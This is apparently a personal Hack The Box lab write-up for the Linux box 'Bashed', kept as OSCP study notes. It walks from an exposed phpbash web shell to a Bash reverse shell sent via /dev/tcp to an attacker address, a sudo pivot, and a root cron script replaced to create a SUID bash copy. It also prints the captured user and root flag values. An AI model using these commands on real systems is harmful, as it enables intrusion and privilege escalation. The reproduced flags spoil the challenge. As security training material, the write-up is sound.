---
tags: [htb, box, linux, easy, web, command-injection, cron]
platform: HTB
os: Linux (Ubuntu 16.04)
hostname: bashed
difficulty: Easy
ip: $BoxIP
status: Complete
domain: N/A
---

# HTB: Bashed, Full Walkthrough

## The gist

Bashed exposes a development PHP web shell at `/dev/phpbash.php`. A harmless `id` request confirms command execution as `www-data`, which provides the foothold. The web user can run a shell as `scriptmanager` through passwordless sudo. A root-owned scheduled task executes the writable `/scripts/test.py`; replacing that script creates a root-owned SUID Bash helper and provides root access.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| OS | Linux |
| Difficulty | Easy |
| IP | `$BoxIP` |
| Hostname | `bashed` |
| Attack path | Exposed PHP web shell -> reverse shell -> sudo run-as pivot -> writable scheduled script -> SUID Bash |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Reconnaissance | See section 1 below |
| 2 | Web enumeration | See section 2 below |
| 3 | Confirm command execution | See section 3 below |
| 4 | Obtain and stabilize the foothold | See section 4 below |
| 5 | Local enumeration and sudo pivot | See section 5 below |
| 6 | Abuse the root scheduled task | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Bashed`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxstart Bashed $BoxIP htb
export WebPort=80
export LocalIP=$(ip route get $BoxIP | awk '{print $7; exit}')
export Port=4444
export Path=dev/phpbash.php
export ScriptDir=/scripts
export ScriptPath=/scripts/test.py
export OutputPath=/scripts/test.txt
```

## 1. Reconnaissance

```bash
sudo nmap -n -p- --min-rate 5000 $BoxIP -oA nmap/allports
sudo nmap -Pn -n -sC -sV -p 80 $BoxIP -oA nmap/services
sudo nmap -Pn -n -sU --top-ports 100 $BoxIP -oA nmap/udp-top100
```

The full TCP scan returned only HTTP on port 80. Service detection identified Apache 2.4.18 on Ubuntu. The UDP top-100 check did not reveal a useful service.

> [!abstract] 🧠 Why
> The full scan establishes the external attack surface before the web workflow begins. The UDP result is only a quick triage check, so a negative top-100 result does not prove that no UDP service exists.

> [!tip] 🛠️ Alternative tools
> If raw SYN scanning is unavailable, use `nmap -sT`. For a quick confirmation of the discovered web service, `curl -I` or `nc -nv -z` can supplement Nmap without replacing the complete scan.

SCREENSHOT: TCP port scan showing only 80/tcp open.

SCREENSHOT: Apache service and title enumeration.

## 2. Web enumeration

```bash
curl -sS -L http://$BoxIP/ -o "$BoxDir/loot/index.html"
feroxbuster -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt -x php -t 40
curl -sS http://$BoxIP/dev/phpbash.php -o "$BoxDir/loot/phpbash.php"
curl -sS http://$BoxIP/dev/phpbash.min.php -o "$BoxDir/loot/phpbash.min.php"
curl -sS http://$BoxIP/config.php -o "$BoxDir/loot/config.php"
grep -Ein 'cmd|command|POST|GET|shell_exec|system|passthru' "$BoxDir/loot/phpbash.php"
```

The development directory exposed `phpbash.php`, a functional PHP command shell. `phpbash.min.php` was also present, while `config.php` returned no useful content.

> [!warning] 💡 Hint
> Development directories deserve priority because they often contain debugging tools, test endpoints, or source that was never meant to be public. Read the returned PHP source before trying to upload a new payload. Here, the existing command shell is already the foothold.

> [!tip] ⚡ More efficient path
> Once a page clearly contains a command parameter, prove it with one harmless identity request. Do not spend time building a second webshell until you know whether the existing endpoint executes commands.

SCREENSHOT: Homepage source and the exposed development link.

SCREENSHOT: Directory and PHP file enumeration.

## 3. Confirm command execution

Use a harmless identity check before attempting a callback:

```bash
curl -sS -X POST --data-urlencode 'cmd=id' http://$BoxIP/dev/phpbash.php
```

The response showed command execution as `www-data`.

> [!abstract] 🧠 Why
> `id` proves both code execution and the security context. That identity determines which files, sudo rules, scheduled tasks, and network operations are worth testing next.

SCREENSHOT: Harmless `id` command executed through phpbash.

## 4. Obtain and stabilize the foothold

Start the listener, then submit the Bash reverse-shell command through the web shell:

```bash
nc -lvnp $Port
curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" "http://$BoxIP/$Path" >/dev/null
```

The callback arrived in the web application directory as `www-data`. Stabilize it:

> [!warning] 💡 Common mistake
> A web command shell and a reverse shell are separate problems. First confirm the web endpoint, then confirm the callback, then upgrade the terminal. If the callback fails, return to a harmless `id` request and test the listener address and egress path independently.

> [!tip] 🛠️ Alternative tools
> Python PTY upgrade is convenient, but `script -qc /bin/bash /dev/null` or a fully interactive SSH session can be used when the target has no suitable Python interpreter.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Suspend and resume the listener as needed, then set terminal behavior:

```text
Ctrl-Z
stty raw -echo
fg
export TERM=xterm
```

SCREENSHOT: Reverse shell received as www-data.

SCREENSHOT: PTY allocated and terminal stabilized.

## 5. Local enumeration and sudo pivot

```bash
id
sudo -l
```

The important sudo rule was:

```text
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

> [!abstract] 🧠 Why
> This is a run-as pivot, not root yet. `sudo -u scriptmanager` changes the user context and may expose files or privileges unavailable to `www-data`; always enumerate the new identity again after the switch.

> [!warning] 💡 Hint
> Read the exact sudo rule rather than assuming `NOPASSWD` means unrestricted root. The permitted target account and command determine the next enumeration branch.

SCREENSHOT: Passwordless sudo rule permitting the run-as pivot.

Switch to the permitted account:

```bash
sudo -u scriptmanager /bin/bash -i
id
whoami
```

SCREENSHOT: Identity confirmed as scriptmanager.

Inspect the discovered script directory:

```bash
ls -la $ScriptDir
cat $ScriptPath
stat $ScriptPath $OutputPath
```

SCREENSHOT: `/scripts` contents and ownership.

The original `test.py` content was:

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

SCREENSHOT: Original `test.py` content.

The script was writable by `scriptmanager`, while `test.txt` was owned by root. File timestamps showed that the scheduled task was executing the script and updating the root-owned output.

> [!warning] 💡 Hint
> Writability alone is not enough. Prove that the script executes with a more privileged identity by checking an output file, ownership, timestamps, or a harmless marker. This avoids replacing a file that is never run.

> [!tip] ⚡ Efficiency
> Use `stat` to establish timing before attempting the payload. Once the modification interval matches a scheduled task, you can wait for one controlled execution instead of repeatedly guessing at cron configuration.

SCREENSHOT: `stat` ownership and timestamp evidence showing the scheduled execution interval.

SCREENSHOT: User proof confirmed at the documented path.

## 6. Abuse the root scheduled task

Save the original script before testing, then replace only the authorized lab file:

```bash
cat $ScriptPath | tee "$BoxDir/loot/test.py.original"
printf 'import os\nos.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")\n' > $ScriptPath
stat $ScriptPath
ls -la /tmp/rootbash
```

SCREENSHOT: Replacement payload written to the scheduled script.

After the next scheduled execution, verify the helper:

```bash
ls -la /tmp/rootbash
/tmp/rootbash -p
id
whoami
```

SCREENSHOT: Root-owned SUID Bash helper created by the scheduled task.

The resulting Bash process had effective UID 0 and `whoami` returned `root`.

> [!abstract] 🧠 Why
> Bash drops privilege when invoked from a SUID copy unless `-p` preserves the effective UID. The important proof is `euid=0`, not merely the presence of a root-owned file.

SCREENSHOT: Root shell obtained through the SUID Bash helper.

## 7. Root verification and loot locations

```bash
id
whoami
hostname
ls -la /root/root.txt /home/arrexel/user.txt
```

The user proof was confirmed at `/home/arrexel/user.txt` and the root proof at `/root/root.txt`. Flag values are reproduced in the private sections above from this write-up.

SCREENSHOT: Root proof confirmed at the documented path.

## 8. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| Public PHP command shell | Prove `id`, then request a callback | Use the existing HTTP command channel for enumeration if callbacks fail |
| Passwordless sudo to another user | Switch with `sudo -u`, then re-enumerate | Inspect the target user's files and sudo rules before trying kernel paths |
| Writable scheduled script with root-owned output | Replace it and wait for the schedule | Use `pspy` or timestamp polling to confirm execution timing |
| SUID Bash helper created | Run with `-p` and verify `euid=0` | Restore the original script and remove the helper from the root context |

The alternate routes are troubleshooting options. The completed chain is the one supported by the evidence captured above.

SCREENSHOT: Restored script and cleaned temporary helper.

## 9. RUNBOOK V2 stages used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]]
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Command Injection|Linux - Command Injection]]
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]]
- [[OSCP/RUNBOOK V2/Linux - Cron Check|Linux - Cron Check]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]]

## 10. Further reading

- [IppSec -- Bashed](https://www.youtube.com/watch?v=K9DKUL7t2xE)

## 11. Collect the flags

### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 35b35dc69af6c4323c61c9f5a711f147
root: cb3f42d2b91c0f9bd92b93a2cfbff10b
```

## 12. Clean down
Restore the exact original scheduled script and remove the temporary SUID helper from a root-context shell:

```bash
printf 'f = open("test.txt", "w")\nf.write("testing 123!")\nf.close\n' > $ScriptPath
/tmp/rootbash -p -c 'rm -f /tmp/rootbash; test ! -e /tmp/rootbash && echo rootbash-removed'
stat $ScriptPath
ls -la /tmp/rootbash
boxdone
```

If the helper was created with root ownership, a non-root shell cannot remove it. Perform cleanup before closing the root context, then verify that the helper is absent and the original script is restored.

> [!warning] 💡 Common mistake
> Restore scheduled scripts and remove SUID helpers before exiting the privileged context. Verify both the original file content and the absence of the helper, rather than assuming the cleanup command succeeded.

### Completion checklist

- [x] Full TCP and targeted UDP enumeration completed
- [x] Web content and PHP development files enumerated
- [x] Command execution validated with a harmless identity check
- [x] Reverse shell obtained and stabilized
- [x] Sudo permissions enumerated and run-as pivot completed
- [x] Scheduled script writability and execution evidence captured
- [x] Root access obtained and verified
- [x] User and root proof paths confirmed
- [x] Original script restored and temporary helper removed
- [x] Screenshots and original script saved to loot

## 13. Attack narrative in one page
```text
HTTP enumeration
  -> exposed phpbash development file
  -> command execution as www-data
  -> Bash reverse shell
  -> passwordless sudo to scriptmanager
  -> writable script executed by root
  -> root-owned SUID Bash helper
  -> effective UID 0
```

## Tools used

- `nmap`
- `curl`
- `feroxbuster`
- `nc`
- `ssh`
- `sudo`
- `python`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| `www-data` | PHP web shell | Initial foothold |
| `scriptmanager` | `sudo -l` | Local enumeration and script modification |
| `root` | Scheduled script abuse | Final access |

- `user.txt`: confirmed at `/home/arrexel/user.txt`
- `root.txt`: confirmed at `/root/root.txt`


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Bashed"
export BoxIP="10.129.1.70"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Bashed"
export Domain=""
export DCip=""
export Username=""
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
$ [16:13:53] loot flag user 35b35dc69af6c4323c61c9f5a711f147
    (scriptmanager : scriptmanager) NOPASSWD: ALL
$ [16:28:05] loot flag root [200~cb3f42d2b91c0f9bd92b93a2cfbff10b
$ [16:28:20] loot flag root cb3f42d2b91c0f9bd92b93a2cfbff10b
kali@kali:~/Platforms/HackTheBox/Bashed [16:13:51] $ [?1h=[?2004hloot flag user 35b35dc69af6c4323c61c9f5a711f147loot[?1l>[?2004l
[+] Flag saved:  user = 35b35dc69af6c4323c61c9f5a711f147  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Bashed [16:13:53] $ [?1h=[?2004hllloot flag user 35b35dc69af6c4323c61c9f5a711f147loloootloott t flag r                                    oot ^[loot[200~cb3f42d2b91c0f9bd92b93a2cfbff10b[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Bashed [16:28:05] $ [?1h=[?2004h~~ loot flag root ^[[200~cb3f42d2b91c0f9bd92b93a2cfbff10bloot       [?1l>[?2004l
[+] Flag saved:  root = cb3f42d2b91c0f9bd92b93a2cfbff10b  →  loot/flags.txt
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Bashed | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Development files and web shells left on production systems are high-value findings -- always enumerate `/dev/`, `/test/`, `/backup/` and similar directories.
- A phpbash form can declare `method="GET"` while its JavaScript sends POST; source analysis reveals the actual request method and parameter.
- A passwordless `sudo -u <user>` rule is a **lateral move**, not a privesc. The goal is to gain a different user's context and reach their writable files or sudo rules, not root directly.
- Proving writable cron script abuse requires four things: writability confirmed, execution confirmed (root-owned output), ownership mismatch (scriptmanager writes, root owns output), and timing (stat Modify `:01` seconds = per-minute cron fingerprint).
- `/tmp/rootbash -p` prevents Bash from dropping its SUID privileges. Without `-p`, the shell falls back to the invoking account rather than remaining root.
- `stat` output showing `Modify` at `:01` seconds is a per-minute cron fingerprint and provides timing evidence for scheduled-task execution.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- web enumeration and command execution
- [[OpenAdmin]] -- exposed administrative web content
- [[Nukem]] -- Linux web exploitation and privilege escalation

## External resources

- [HackTricks Linux scheduled tasks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/README.html)
- [GTFOBins Bash](https://gtfobins.github.io/gtfobins/bash/)
- [phpbash](https://github.com/Arrexel/phpbash)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Bashed rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
